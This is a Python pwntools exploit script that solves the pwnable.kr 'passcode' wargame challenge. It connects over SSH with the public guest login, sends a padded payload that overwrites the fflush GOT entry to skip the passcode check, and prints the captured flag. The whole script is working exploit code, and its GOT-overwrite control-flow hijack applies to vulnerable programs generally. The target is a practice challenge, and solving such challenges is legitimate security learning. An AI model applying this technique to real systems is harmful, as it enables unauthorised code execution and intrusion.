from pwn import *

fflushGOTaddress = 0x804a004
addressAfterPasscodeCheck = 0x080485e3
padding = b'A'*96

payload1 = padding + p32(fflushGOTaddress) 
payload2 = str(addressAfterPasscodeCheck).encode()

#with open('payload','wb') as file:
#    file.write(payload)

remote = ssh('passcode','pwnable.kr',2222,'guest')
passcodeProcess = remote.process([],'passcode')
passcodeProcess.recvline()
passcodeProcess.sendline(payload1)
passcodeProcess.recvline()
passcodeProcess.sendline(payload2)
rawFlagLine = str(passcodeProcess.recvline())
flag = rawFlagLine.split(': ')[1][:-3]
print('FLAG: ' + flag)
